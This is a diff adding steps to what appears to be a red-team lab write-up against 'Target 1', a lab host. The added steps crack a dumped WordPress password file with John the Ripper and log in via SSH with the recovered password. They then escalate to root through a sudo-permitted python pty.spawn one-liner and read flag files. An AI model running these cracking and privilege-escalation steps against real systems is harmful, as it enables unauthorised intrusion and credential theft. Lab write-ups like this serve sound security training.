@@ -145,3 +145,20 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
           scp michael@192.168.1.110:/tmp/wp_users.csv .
           ```
           ![Target1/wp_users_exfiltration.JPG](Target1/wp_users_exfiltration.JPG)
+       - Renamed file to passwd and ran john the cracker: steven's password is "pink84"
+         `john passwd`
+         ![Target1/john_cracks_steven.JPG](Target1/john_cracks_steven.JPG)
+       - Logged in as steven and found steven's sudo priviledges allow him to run /usr/bin/python as root:
+         ```
+         ssh steven@192.168.1.110
+         sudo -l
+         ```
+         ![Target1/steven_has_sudo_python_access.JPG](Target1/steven_has_sudo_python_access.JPG)steven_has_sudo_python_access.JPG
+       - Escalated priviledge to root and found flag:
+         ```
+         sudo /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
+         cd /root
+         ls
+         cat *.txt
+         ```
+         ![Target1/flag4_found](Target1/flag4_found.JPG
